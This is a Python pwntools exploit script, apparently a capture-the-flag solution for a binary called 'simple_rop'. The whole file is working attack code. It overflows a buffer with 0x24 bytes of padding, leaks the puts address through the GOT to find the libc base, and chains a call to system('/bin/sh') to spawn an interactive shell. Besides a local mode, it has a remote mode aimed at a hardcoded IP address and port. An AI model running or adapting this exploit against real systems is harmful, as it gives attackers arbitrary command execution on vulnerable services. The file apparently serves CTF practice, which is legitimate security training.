#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(arch="i386", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./simple_rop')
    libc_puts = 0x5fca0
    libc_system = 0x3ada0
    libc_bin_sh = 0x15ba0b
else:
    p = remote('47.106.94.13', 50012)
    libc_puts = 0x05f140
    libc_system = 0x03a940
    libc_bin_sh = 0x15902b
elf = ELF('./simple_rop', checksec=False)
got_puts = elf.got['puts']
plt_puts = elf.plt['puts']
addr_main = 0x0804864B

# gdb.attach(p, "b *0x08048717\nb *0x080487B6\nc")
pd = 'a' * 0x24
pd += p32(plt_puts)
pd += p32(addr_main)
pd += p32(got_puts)
p.sendafter('You need search Rop\n', pd)
p.sendlineafter('Give you a cursor: \n', str(0x80000000))
p.recvuntil('copy over!\n')

addr_puts = u32(p.recv(4))
libcbase = addr_puts - libc_puts
addr_system = libcbase + libc_system
addr_bin_sh = libcbase + libc_bin_sh
success('addr_puts = ' + hex(addr_puts))

pd = 'a' * 0x24
pd += p32(addr_system)
pd += p32(addr_main)
pd += p32(addr_bin_sh)
p.sendafter('You need search Rop\n', pd)
p.sendlineafter('Give you a cursor: \n', str(0x80000000))
p.recvuntil('copy over!\n')
p.interactive()
